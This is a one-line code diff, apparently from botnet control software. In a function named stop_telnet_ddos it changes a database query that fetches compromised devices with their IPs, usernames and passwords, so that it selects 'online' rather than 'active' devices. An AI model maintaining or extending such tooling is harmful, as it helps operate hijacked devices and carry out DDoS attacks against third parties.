@@ -679,7 +679,7 @@ def stop_telnet_ddos():
         # Get all compromised devices from the database
         conn = db_manager.get_connection()
         cursor = conn.cursor()
-        cursor.execute('SELECT ip, username, password FROM devices WHERE status = "active"')
+        cursor.execute('SELECT ip, username, password FROM devices WHERE status = "online"')
         devices = cursor.fetchall()
         conn.close()
         
